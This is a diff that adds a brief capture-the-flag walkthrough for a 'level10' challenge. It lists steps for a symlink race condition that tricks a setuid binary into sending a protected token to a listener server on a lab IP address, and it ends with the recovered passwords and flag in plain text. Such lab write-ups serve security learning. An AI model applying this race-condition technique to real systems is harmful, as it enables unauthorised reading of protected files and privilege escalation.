@@ -1,0 +1,19 @@
+level10 : s5cAJpM8ev6XHw998pRWG728z
+Process :
+    - ls -la
+    - ./level10 token
+    - ./level10 token localhost
+    - create server.py in (192.168.56.1)
+    - ./level10 token 192.168.56.1
+    - echo "test" > /tmp/fakelink
+    - ./level10 /tmp/fakelink 192.168.56.1
+    - ln -s /tmp/fakelink /tmp/link
+    - create script in /tmp/
+    - chmod +x /tmp/script
+    - run server.py
+    - run /tmp/script
+    - ./level10 /tmp/link 192.168.56.1
+    - Pray (1/5)
+    - Get the password : woupa2yuojeeaaed06riuj63c
+    - su flag10 password = woupa2yuojeeaaed06riuj63c
+    - getflag = feulo4b72j7edeahuete3no7c
